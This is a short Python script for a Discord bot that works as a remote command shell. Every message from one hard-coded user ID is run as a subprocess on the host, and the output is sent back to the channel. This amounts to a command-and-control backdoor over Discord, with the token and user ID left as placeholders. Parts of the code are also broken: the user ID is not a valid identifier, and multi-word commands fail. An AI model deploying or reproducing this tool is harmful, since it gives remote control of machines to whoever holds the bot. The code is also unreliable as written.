from discord.ext import commands
from discord.utils import get
from discord.ext.commands import Bot
import discord
from discord.utils import get
import subprocess
import time

dis_token = "DISCORD-TOKEN"

def Exec(cmd):
    output = subprocess.check_output(cmd, shell=False)
    return output

intents = discord.Intents.all()
intents.members = True
intents.reactions = True
intents.guilds = True
bot = Bot("!", intents=intents)

@bot.command()
async def IssueCmd(ctx, arg):
    await ctx.send(arg)
    
@bot.event
async def on_message(message):
    if(message.author.id == User-ID):
        await message.channel.send(Exec(message.content).decode("utf-8"))

bot.run(dis_token)
